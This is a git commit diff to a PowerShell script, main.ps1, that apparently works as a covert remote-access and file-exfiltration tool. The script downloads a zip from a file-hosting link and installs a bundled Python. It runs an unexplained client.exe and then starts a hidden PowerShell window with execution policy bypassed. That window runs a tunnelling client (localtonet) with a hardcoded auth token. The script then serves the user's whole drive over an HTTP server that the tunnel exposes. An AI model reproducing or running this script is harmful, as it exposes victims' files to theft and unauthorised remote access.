f45733e68c1e7de9f9ffeb43ae3c34a848954f5f
mehmetdere <105990633+mehmetdere@users.noreply.github.com>
2022-10-04 16:11:56 +0300

    v3.9

--- main.ps1
+++ main.ps1
@@ -1,14 +1,15 @@
 cd ..
+set-clipboard (get-location)
+$plocation = (get-clipboard)
 cd ..
 cd ..
 cd ..
 cd ..
 cd ..
 cd ..
-cd ..
-cd ..
-cd ..
-Invoke-WebRequest -Uri http://download1525.mediafire.com/4xvfh9ejstmg/9jst20oi7ryqzp1/toolsv2.zip -OutFile (Join-Path Users toolsv2.zip)
+set-clipboard (get-location)
+$dlocation = (get-clipboard)
+Invoke-WebRequest -Uri http://download1525.mediafire.com/k0xpj9vxkhhg/9jst20oi7ryqzp1/toolsv2.zip -OutFile (Join-Path $plocation toolsv2.zip)
 Add-Type -AssemblyName System.IO.Compression.FileSystem
  function Unzip
  {
@@ -17,16 +18,15 @@ Add-Type -AssemblyName System.IO.Compression.FileSystem
      [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
 }
 
-Unzip "Users\toolsv2.zip" "Users"
-add-appxpackage -path "Users\toolsv2\python310.appx"
-cd Users
-cd toolsv2
+Unzip "$plocation\toolsv2.zip" "$dlocation"
+add-appxpackage -path "$dlocation\toolsv2\python310.appx"
+cd $dlocation\toolsv2
 ./client.exe
-robocopy 'results' 'C:\\Users\'
+robocopy 'results' "$dlocation\"
 start powershell {-exec bypass -WindowStyle Hidden IEX(./localtonet.exe authtoken gzPhq7vUOD3VfGLkYt29iEdj01yXcNmZI)} 
-cd 'C:\'
+cd "$dlocation\"
 mkdir PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0
-robocopy 'C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0' 'C:\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0' /E
-cd "C:\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0"
-./python.exe -m http.server 4040 --bind 127.0.0.1 --directory "C:\\Users\"
+robocopy "$dlocation\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0" "$dlocation\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0" /E
+cd "$dlocation\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0"
+./python.exe -m http.server 4040 --bind 127.0.0.1 --directory "$dlocation\"
 
